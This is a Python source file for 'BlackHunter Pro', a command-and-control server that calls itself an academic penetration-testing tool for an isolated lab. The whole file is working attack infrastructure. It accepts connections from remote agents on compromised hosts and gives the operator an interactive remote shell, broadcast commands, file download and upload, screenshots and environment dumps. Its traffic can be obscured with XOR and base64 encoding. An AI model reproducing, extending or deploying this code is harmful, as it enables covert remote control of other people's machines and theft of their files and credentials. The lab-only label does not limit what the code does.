#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# c2_server/server.py
# BlackHunter Pro - C2 Server
# Command & Control Server for managing remote agents
# Academic Penetration Testing Tool - Isolated Lab Only

import os
import sys
import json
import ssl
import time
import socket
import base64
import hashlib
import threading
import argparse
import signal
from datetime import datetime
from queue import Queue

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

# =============================================
# CONFIGURATION
# =============================================

DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 4443
DEFAULT_WEB_PORT = 8080
BUFFER_SIZE = 65536
MAX_CLIENTS = 100
HEARTBEAT_INTERVAL = 30

# =============================================
# COLORS
# =============================================

class Colors:
    RED = '\033[0;31m'
    GREEN = '\033[0;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[0;34m'
    MAGENTA = '\033[0;35m'
    CYAN = '\033[0;36m'
    WHITE = '\033[1;37m'
    DIM = '\033[2m'
    RESET = '\033[0m'

C = Colors

# =============================================
# BANNER
# =============================================

BANNER = f"""
{C.RED}   ██████╗██████╗     ███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗ 
{C.RED}  ██╔════╝╚════██╗    ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗
{C.RED}  ██║      █████╔╝    ███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝
{C.RED}  ██║      ╚═══██╗    ╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗
{C.RED}  ╚██████╗██████╔╝    ███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║
{C.RED}   ╚═════╝╚═════╝     ╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝
{C.RESET}
{C.YELLOW}                    Command & Control Server v1.0
{C.CYAN}              Academic Penetration Testing Tool
{C.GREEN}              Isolated Lab Environment Only
{C.RESET}
"""

# =============================================
# LOGGING
# =============================================

LOG_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, "server.log")

def log(message, level="INFO"):
    """Log message to console and file"""
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    colors = {
        "INFO": C.CYAN,
        "OK": C.GREEN,
        "WARN": C.YELLOW,
        "ERROR": C.RED,
        "CLIENT": C.MAGENTA,
        "CMD": C.BLUE,
    }

    color = colors.get(level, C.WHITE)
    print(f"{color}[{timestamp}] [{level}]{C.RESET} {message}")

    try:
        with open(LOG_FILE, 'a', encoding='utf-8') as f:
            f.write(f"[{timestamp}] [{level}] {message}\n")
    except:
        pass

# =============================================
# ENCRYPTION UTILITIES
# =============================================

class Encryption:
    """Simple encryption for C2 communications"""

    @staticmethod
    def xor_encrypt(data, key):
        """XOR encrypt data"""
        if isinstance(data, str):
            data = data.encode()
        if isinstance(key, str):
            key = key.encode()

        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ key[i % len(key)])

        return bytes(result)

    @staticmethod
    def xor_decrypt(data, key):
        """XOR decrypt (same as encrypt)"""
        return Encryption.xor_encrypt(data, key)

    @staticmethod
    def b64_encode(data):
        """Base64 encode"""
        if isinstance(data, str):
            data = data.encode()
        return base64.b64encode(data).decode()

    @staticmethod
    def b64_decode(data):
        """Base64 decode"""
        if isinstance(data, str):
            data = data.encode()
        return base64.b64decode(data)

# =============================================
# CLIENT CLASS
# =============================================

class Client:
    """Represents a connected agent"""

    def __init__(self, client_id, socket, address):
        self.id = client_id
        self.socket = socket
        self.address = address
        self.info = {}
        self.connected_at = datetime.now()
        self.last_seen = datetime.now()
        self.status = "active"
        self.command_history = []
        self.lock = threading.Lock()

    def send(self, data):
        """Send data to client"""
        try:
            with self.lock:
                if isinstance(data, str):
                    data = data.encode()

                # Length-prefixed message
                length = len(data)
                self.socket.sendall(length.to_bytes(4, 'big') + data)

            self.last_seen = datetime.now()
            return True
        except Exception as e:
            log(f"Send to {self.id} failed: {e}", "ERROR")
            self.status = "dead"
            return False

    def recv(self, timeout=None):
        """Receive data from client"""
        try:
            if timeout:
                self.socket.settimeout(timeout)

            # Read length
            length_data = self._recv_exact(4)
            if not length_data:
                return None

            length = int.from_bytes(length_data, 'big')

            if length > BUFFER_SIZE:
                log(f"Message too large from {self.id}: {length}", "WARN")
                return None

            # Read data
            data = self._recv_exact(length)
            self.last_seen = datetime.now()
            return data

        except socket.timeout:
            return None
        except Exception as e:
            log(f"Recv from {self.id} failed: {e}", "ERROR")
            self.status = "dead"
            return None

    def _recv_exact(self, n):
        """Receive exactly n bytes"""
        data = b''
        while len(data) < n:
            chunk = self.socket.recv(n - len(data))
            if not chunk:
                return None
            data += chunk
        return data

    def close(self):
        """Close client connection"""
        try:
            self.socket.close()
        except:
            pass

    def to_dict(self):
        """Convert to dictionary"""
        return {
            'id': self.id,
            'address': self.address[0],
            'port': self.address[1],
            'info': self.info,
            'connected_at': self.connected_at.isoformat(),
            'last_seen': self.last_seen.isoformat(),
            'status': self.status,
            'commands': len(self.command_history),
        }

    def show_info(self):
        """Display client info"""
        info = self.info

        print(f"""
{C.CYAN}╔═══════════════════════════════════════════════════════╗
{C.CYAN}║{C.WHITE}              CLIENT INFORMATION                      {C.CYAN}║
{C.CYAN}╠═══════════════════════════════════════════════════════╣
{C.CYAN}║{C.GREEN}  ID:         {C.WHITE}{self.id:<35}{C.CYAN}║
{C.CYAN}║{C.GREEN}  IP:         {C.WHITE}{self.address[0]:<35}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Connected:  {C.WHITE}{self.connected_at.strftime('%Y-%m-%d %H:%M:%S'):<35}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Last Seen:  {C.WHITE}{self.last_seen.strftime('%Y-%m-%d %H:%M:%S'):<35}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Status:     {C.WHITE}{self.status:<35}{C.CYAN}║
{C.CYAN}║{C.GREEN}  Commands:   {C.WHITE}{len(self.command_history):<35}{C.CYAN}║
{C.CYAN}╠═══════════════════════════════════════════════════════╣
{C.CYAN}║{C.WHITE}              SYSTEM INFO                             {C.CYAN}║
{C.CYAN}╠═══════════════════════════════════════════════════════╣""")

        if info:
            for key, value in info.items():
                key_str = str(key)[:15]
                val_str = str(value)[:40]
                print(f"{C.CYAN}║{C.GREEN}  {key_str:<15}{C.WHITE}{val_str:<40}{C.CYAN}║")
        else:
            print(f"{C.CYAN}║{C.YELLOW}  No system info available{C.CYAN}{' ' * 35}║")

        print(f"{C.CYAN}╚═══════════════════════════════════════════════════════╝{C.RESET}")

# =============================================
# C2 SERVER CLASS
# =============================================

class C2Server:
    """Command & Control Server"""

    def __init__(self, host=DEFAULT_HOST, port=DEFAULT_PORT, use_tls=False):
        self.host = host
        self.port = port
        self.use_tls = use_tls

        self.clients = {}
        self.client_counter = 0
        self.lock = threading.Lock()

        self.server_socket = None
        self.running = False
        self.ssl_context = None

        self.command_queue = Queue()
        self.current_client = None

        # Stats
        self.stats = {
            'started_at': datetime.now(),
            'total_connections': 0,
            'total_commands': 0,
        }

    # =============================================
    # START SERVER
    # =============================================

    def start(self):
        """Start C2 server"""
        print(BANNER)

        log(f"Starting C2 server on {self.host}:{self.port}", "INFO")

        # Setup SSL if enabled
        if self.use_tls:
            self._setup_ssl()

        # Create socket
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        try:
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(MAX_CLIENTS)
            log(f"Server listening on {self.host}:{self.port}", "OK")
        except Exception as e:
            log(f"Failed to bind: {e}", "ERROR")
            return False

        self.running = True

        # Start listener thread
        listener_thread = threading.Thread(target=self._accept_loop, daemon=True)
        listener_thread.start()

        # Start command processor
        processor_thread = threading.Thread(target=self._command_processor, daemon=True)
        processor_thread.start()

        log("Server started successfully", "OK")
        log("Type 'help' for available commands", "INFO")

        return True

    def _setup_ssl(self):
        """Setup SSL context"""
        cert_file = os.path.join(os.path.dirname(__file__), "server.crt")
        key_file = os.path.join(os.path.dirname(__file__), "server.key")

        if not os.path.exists(cert_file) or not os.path.exists(key_file):
            log("SSL certificates not found, generating...", "WARN")
            self._generate_certificates()

        try:
            self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            self.ssl_context.load_cert_chain(cert_file, key_file)
            log("SSL context initialized", "OK")
        except Exception as e:
            log(f"SSL setup failed: {e}", "ERROR")
            self.ssl_context = None

    def _generate_certificates(self):
        """Generate self-signed certificates"""
        cert_file = os.path.join(os.path.dirname(__file__), "server.crt")
        key_file = os.path.join(os.path.dirname(__file__), "server.key")

        cmd = (
            f'openssl req -x509 -newkey rsa:4096 -nodes '
            f'-out "{cert_file}" -keyout "{key_file}" '
            f'-days 365 -subj "/CN=BlackHunter-C2"'
        )

        os.system(cmd)

    # =============================================
    # ACCEPT LOOP
    # =============================================

    def _accept_loop(self):
        """Accept incoming connections"""
        while self.running:
            try:
                self.server_socket.settimeout(1.0)
                client_socket, address = self.server_socket.accept()

                # Wrap with SSL if enabled
                if self.ssl_context:
                    try:
                        client_socket = self.ssl_context.wrap_socket(
                            client_socket, server_side=True
                        )
                    except Exception as e:
                        log(f"SSL handshake failed: {e}", "ERROR")
                        client_socket.close()
                        continue

                # Create client
                with self.lock:
                    self.client_counter += 1
                    client_id = f"agent_{self.client_counter:03d}"
                    client = Client(client_id, client_socket, address)
                    self.clients[client_id] = client

                self.stats['total_connections'] += 1

                log(f"New connection: {client_id} from {address[0]}:{address[1]}", "CLIENT")

                # Start handler thread
                handler_thread = threading.Thread(
                    target=self._client_handler,
                    args=(client,),
                    daemon=True
                )
                handler_thread.start()

            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    log(f"Accept failed: {e}", "ERROR")
                break

    # =============================================
    # CLIENT HANDLER
    # =============================================

    def _client_handler(self, client):
        """Handle client connection"""
        try:
            # Send handshake
            handshake = json.dumps({
                'type': 'handshake',
                'server': 'BlackHunter-C2',
                'version': '1.0',
            })
            client.send(handshake)

            # Wait for client info
            data = client.recv(timeout=10)

            if data:
                try:
                    info = json.loads(data.decode())
                    if info.get('type') == 'info':
                        client.info = info.get('data', {})
                        log(f"Client {client.id} info received: {client.info.get('hostname', 'unknown')}", "OK")
                except json.JSONDecodeError:
                    log(f"Invalid info from {client.id}", "WARN")

            # Keep connection alive
            while self.running and client.status == "active":
                # Heartbeat check
                try:
                    client.send(json.dumps({'type': 'ping'}))
                except:
                    break

                # Wait for response
                data = client.recv(timeout=HEARTBEAT_INTERVAL)

                if data is None:
                    if client.status == "dead":
                        break
                    continue

                # Handle response
                try:
                    response = json.loads(data.decode())

                    if response.get('type') == 'pong':
                        continue

                    if response.get('type') == 'result':
                        self._handle_result(client, response)

                except json.JSONDecodeError:
                    log(f"Invalid response from {client.id}", "WARN")

        except Exception as e:
            log(f"Client handler error ({client.id}): {e}", "ERROR")
        finally:
            self._disconnect_client(client)

    def _handle_result(self, client, response):
        """Handle command result from client"""
        cmd = response.get('command', 'unknown')
        output = response.get('output', '')

        print(f"\n{C.GREEN}[{client.id}] Result for '{cmd}':{C.RESET}")
        print(f"{C.WHITE}{output}{C.RESET}\n")

    def _disconnect_client(self, client):
        """Disconnect a client"""
        with self.lock:
            if client.id in self.clients:
                del self.clients[client.id]

        client.close()
        log(f"Client disconnected: {client.id}", "CLIENT")

    # =============================================
    # COMMAND PROCESSOR
    # =============================================

    def _command_processor(self):
        """Process commands from queue"""
        while self.running:
            try:
                if self.command_queue.empty():
                    time.sleep(0.1)
                    continue

                command = self.command_queue.get(timeout=1)

                if command == "exit":
                    break

                # Process command
                self._process_command(command)

            except Exception as e:
                log(f"Command processor error: {e}", "ERROR")

    def _process_command(self, command):
        """Process a single command"""
        parts = command.strip().split()
        if not parts:
            return

        cmd = parts[0].lower()

        # LIST - list all clients
        if cmd == "list":
            self.cmd_list()

        # SELECT - select a client
        elif cmd == "select" and len(parts) >= 2:
            self.cmd_select(parts[1])

        # INFO - show current client info
        elif cmd == "info":
            if self.current_client:
                self.current_client.show_info()
            else:
                log("No client selected. Use 'select <id>'", "WARN")

        # SEND - send command to client
        elif cmd == "send" and len(parts) >= 2:
            if self.current_client:
                cmd_str = ' '.join(parts[1:])
                self.send_command(self.current_client.id, cmd_str)
            else:
                log("No client selected", "WARN")

        # SHELL - interactive shell
        elif cmd == "shell" or cmd == "cmd":
            if self.current_client:
                self.cmd_shell()
            else:
                log("No client selected", "WARN")

        # QUICK COMMANDS
        elif cmd in ["sysinfo", "whoami", "pwd", "ls", "ps", "screenshot", "ipconfig", "netstat", "env"]:
            if self.current_client:
                self.send_command(self.current_client.id, cmd)
            else:
                log("No client selected", "WARN")

        # DOWNLOAD - download file from client
        elif cmd == "download" and len(parts) >= 2:
            if self.current_client:
                self.send_command(self.current_client.id, f"download {parts[1]}")
            else:
                log("No client selected", "WARN")

        # UPLOAD - upload file to client
        elif cmd == "upload" and len(parts) >= 3:
            if self.current_client:
                self.send_command(self.current_client.id, f"upload {parts[1]} {parts[2]}")
            else:
                log("No client selected", "WARN")

        # BROADCAST - send to all clients
        elif cmd == "broadcast" and len(parts) >= 2:
            cmd_str = ' '.join(parts[1:])
            self.cmd_broadcast(cmd_str)

        # KILL - disconnect client
        elif cmd == "kill" and len(parts) >= 2:
            self.cmd_kill(parts[1])

        # STATS - show server stats
        elif cmd == "stats":
            self.cmd_stats()

        # CLEAR - clear screen
        elif cmd == "clear" or cmd == "cls":
            os.system('cls' if os.name == 'nt' else 'clear')
            print(BANNER)

        # HELP
        elif cmd == "help":
            self.cmd_help()

        # EXIT
        elif cmd == "exit" or cmd == "quit":
            self.stop()

        else:
            log(f"Unknown command: {cmd}", "WARN")
            log("Type 'help' for available commands", "INFO")

    # =============================================
    # COMMANDS
    # =============================================

    def cmd_list(self):
        """List all connected clients"""
        with self.lock:
            clients = list(self.clients.values())

        if not clients:
            log("No clients connected", "WARN")
            return

        print(f"\n{C.CYAN}╔═══════════════════════════════════════════════════════════════════════╗")
        print(f"║{C.WHITE}                        CONNECTED CLIENTS ({len(clients)})                        {C.CYAN}║")
        print(f"╠══════════╦═══════════════════╦════════════════╦══════════════╦═════════════╣")
        print(f"║{C.WHITE}    ID    {C.CYAN}║{C.WHITE}       IP          {C.CYAN}║{C.WHITE}    HOSTNAME    {C.CYAN}║{C.WHITE}      OS      {C.CYAN}║{C.WHITE}   STATUS    {C.CYAN}║")
        print(f"╠══════════╬═══════════════════╬════════════════╬══════════════╬═════════════╣")

        for client in clients:
            hostname = client.info.get('hostname', 'unknown')[:14]
            os_info = client.info.get('os', 'unknown')[:12]
            status_color = C.GREEN if client.status == 'active' else C.RED

            marker = "►" if client == self.current_client else " "
            print(f"║ {marker}{C.GREEN}{client.id:<7}{C.CYAN} ║ {C.WHITE}{client.address[0]:<17}{C.CYAN} ║ {C.WHITE}{hostname:<14}{C.CYAN} ║ {C.WHITE}{os_info:<12}{C.CYAN} ║ {status_color}{client.status:<11}{C.CYAN} ║")

        print(f"╚══════════╩═══════════════════╩════════════════╩══════════════╩═════════════╝{C.RESET}\n")

    def cmd_select(self, client_id):
        """Select a client"""
        if client_id not in self.clients:
            log(f"Client not found: {client_id}", "ERROR")
            return

        self.current_client = self.clients[client_id]
        log(f"Selected client: {client_id}", "OK")
        self.current_client.show_info()

    def cmd_broadcast(self, command):
        """Send command to all clients"""
        with self.lock:
            clients = list(self.clients.values())

        if not clients:
            log("No clients connected", "WARN")
            return

        log(f"Broadcasting: {command}", "CMD")

        for client in clients:
            self.send_command(client.id, command)

    def cmd_kill(self, client_id):
        """Disconnect a client"""
        if client_id not in self.clients:
            log(f"Client not found: {client_id}", "ERROR")
            return

        client = self.clients[client_id]
        client.send(json.dumps({'type': 'command', 'command': 'exit'}))
        time.sleep(0.5)
        self._disconnect_client(client)

    def cmd_stats(self):
        """Show server statistics"""
        uptime = datetime.now() - self.stats['started_at']

        print(f"\n{C.CYAN}╔═══════════════════════════════════════════════════════╗")
        print(f"║{C.WHITE}               SERVER STATISTICS                      {C.CYAN}║")
        print(f"╠═══════════════════════════════════════════════════════╣")
        print(f"║{C.GREEN}  Started:          {C.WHITE}{self.stats['started_at'].strftime('%Y-%m-%d %H:%M:%S'):<35}{C.CYAN}║")
        print(f"║{C.GREEN}  Uptime:           {C.WHITE}{str(uptime).split('.')[0]:<35}{C.CYAN}║")
        print(f"║{C.GREEN}  Total Connections:{C.WHITE}{self.stats['total_connections']:<35}{C.CYAN}║")
        print(f"║{C.GREEN}  Active Clients:   {C.WHITE}{len(self.clients):<35}{C.CYAN}║")
        print(f"║{C.GREEN}  Commands Sent:    {C.WHITE}{self.stats['total_commands']:<35}{C.CYAN}║")
        print(f"╚═══════════════════════════════════════════════════════╝{C.RESET}\n")

    def cmd_shell(self):
        """Interactive shell"""
        client = self.current_client

        if not client:
            log("No client selected", "WARN")
            return

        print(f"\n{C.GREEN}=== Interactive Shell: {client.id} ==={C.RESET}")
        print(f"{C.YELLOW}Type 'exit' to return to main menu{C.RESET}\n")

        while True:
            try:
                cmd = input(f"{C.RED}shell@{client.id}> {C.RESET}").strip()

                if cmd.lower() in ['exit', 'quit', 'back']:
                    break

                if not cmd:
                    continue

                # Send command
                self.send_command(client.id, cmd)

                # Wait for output (brief)
                time.sleep(0.5)

            except KeyboardInterrupt:
                print()
                break
            except EOFError:
                break

    def cmd_help(self):
        """Show help"""
        print(f"""
{C.CYAN}╔═══════════════════════════════════════════════════════════════════════╗
║{C.WHITE}                        C2 SERVER COMMANDS                            {C.CYAN}║
╠═══════════════════════════════════════════════════════════════════════╣
║{C.GREEN}  list                    {C.WHITE}List all connected clients                 {C.CYAN}║
║{C.GREEN}  select <id>             {C.WHITE}Select a client to interact with           {C.CYAN}║
║{C.GREEN}  info                    {C.WHITE}Show selected client info                  {C.CYAN}║
║{C.GREEN}  shell                   {C.WHITE}Interactive shell with selected client     {C.CYAN}║
║{C.GREEN}  send <cmd>              {C.WHITE}Send command to selected client            {C.CYAN}║
║{C.GREEN}  broadcast <cmd>         {C.WHITE}Send command to all clients                {C.CYAN}║
║{C.GREEN}  download <file>         {C.WHITE}Download file from client                  {C.CYAN}║
║{C.GREEN}  upload <local> <remote> {C.WHITE}Upload file to client                      {C.CYAN}║
║{C.GREEN}  kill <id>               {C.WHITE}Disconnect a client                        {C.CYAN}║
║{C.GREEN}  stats                   {C.WHITE}Show server statistics                     {C.CYAN}║
║{C.GREEN}  clear                   {C.WHITE}Clear screen                               {C.CYAN}║
║{C.GREEN}  help                    {C.WHITE}Show this help                             {C.CYAN}║
║{C.GREEN}  exit                    {C.WHITE}Stop server and exit                       {C.CYAN}║
╠═══════════════════════════════════════════════════════════════════════╣
║{C.YELLOW}                     QUICK COMMANDS (selected client)                  {C.CYAN}║
╠═══════════════════════════════════════════════════════════════════════╣
║{C.GREEN}  sysinfo                 {C.WHITE}Get system information                     {C.CYAN}║
║{C.GREEN}  whoami                  {C.WHITE}Get current user                           {C.CYAN}║
║{C.GREEN}  pwd                     {C.WHITE}Print working directory                    {C.CYAN}║
║{C.GREEN}  ls                      {C.WHITE}List files                                 {C.CYAN}║
║{C.GREEN}  ps                      {C.WHITE}List processes                             {C.CYAN}║
║{C.GREEN}  screenshot              {C.WHITE}Take screenshot                            {C.CYAN}║
║{C.GREEN}  ipconfig                {C.WHITE}Network information                        {C.CYAN}║
║{C.GREEN}  netstat                 {C.WHITE}Network connections                        {C.CYAN}║
║{C.GREEN}  env                     {C.WHITE}Environment variables                      {C.CYAN}║
╚═══════════════════════════════════════════════════════════════════════╝{C.RESET}
""")

    # =============================================
    # SEND COMMAND
    # =============================================

    def send_command(self, client_id, command):
        """Send command to client"""
        if client_id not in self.clients:
            log(f"Client not found: {client_id}", "ERROR")
            return False

        client = self.clients[client_id]

        try:
            message = json.dumps({
                'type': 'command',
                'command': command,
                'timestamp': datetime.now().isoformat(),
            })

            if client.send(message):
                client.command_history.append({
                    'command': command,
                    'sent_at': datetime.now().isoformat(),
                })

                self.stats['total_commands'] += 1
                log(f"Sent to {client_id}: {command}", "CMD")
                return True

        except Exception as e:
            log(f"Send command failed: {e}", "ERROR")

        return False

    # =============================================
    # STOP SERVER
    # =============================================

    def stop(self):
        """Stop server"""
        log("Stopping server...", "INFO")

        self.running = False

        # Disconnect all clients
        with self.lock:
            for client in list(self.clients.values()):
                try:
                    client.send(json.dumps({'type': 'command', 'command': 'exit'}))
                    time.sleep(0.1)
                    client.close()
                except:
                    pass
            self.clients.clear()

        # Close server socket
        if self.server_socket:
            try:
                self.server_socket.close()
            except:
                pass

        log("Server stopped", "OK")

    # =============================================
    # INTERACTIVE SHELL
    # =============================================

    def interactive(self):
        """Interactive command loop"""
        log("Entering interactive mode", "INFO")

        while self.running:
            try:
                # Prompt
                if self.current_client:
                    prompt = f"{C.GREEN}[{self.current_client.id}]{C.RESET} > "
                else:
                    prompt = f"{C.CYAN}[C2]{C.RESET} > "

                command = input(prompt).strip()

                if not command:
                    continue

                if command.lower() in ["exit", "quit"]:
                    self.stop()
                    break

                self.command_queue.put(command)

            except KeyboardInterrupt:
                print()
                if input(f"{C.YELLOW}Stop server? (y/n): {C.RESET}").lower() == 'y':
                    self.stop()
                    break
            except EOFError:
                break

# =============================================
# MAIN
# =============================================

def main():
    parser = argparse.ArgumentParser(
        description="BlackHunter C2 Server",
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )

    parser.add_argument('-H', '--host', default=DEFAULT_HOST, help="Bind host")
    parser.add_argument('-p', '--port', type=int, default=DEFAULT_PORT, help="Bind port")
    parser.add_argument('--tls', action='store_true', help="Enable TLS")
    parser.add_argument('--gen-cert', action='store_true', help="Generate certificates")
    parser.add_argument('--web', action='store_true', help="Start web UI")
    parser.add_argument('--web-port', type=int, default=DEFAULT_WEB_PORT, help="Web UI port")

    args = parser.parse_args()

    # Generate certificates
    if args.gen_cert:
        print(BANNER)
        log("Generating SSL certificates...", "INFO")
        cert_file = os.path.join(os.path.dirname(__file__), "server.crt")
        key_file = os.path.join(os.path.dirname(__file__), "server.key")

        cmd = (
            f'openssl req -x509 -newkey rsa:4096 -nodes '
            f'-out "{cert_file}" -keyout "{key_file}" '
            f'-days 365 -subj "/CN=BlackHunter-C2"'
        )

        os.system(cmd)
        log(f"Certificates generated: {cert_file}", "OK")
        return

    # Start server
    server = C2Server(host=args.host, port=args.port, use_tls=args.tls)

    if not server.start():
        log("Failed to start server", "ERROR")
        sys.exit(1)

    # Signal handlers
    def signal_handler(sig, frame):
        print()
        server.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    # Start web UI if requested
    if args.web:
        try:
            from web_ui import WebUI
            web = WebUI(server, port=args.web_port)
            web.start()
        except ImportError:
            log("Web UI module not found", "WARN")

    # Interactive mode
    server.interactive()


if __name__ == "__main__":
    main()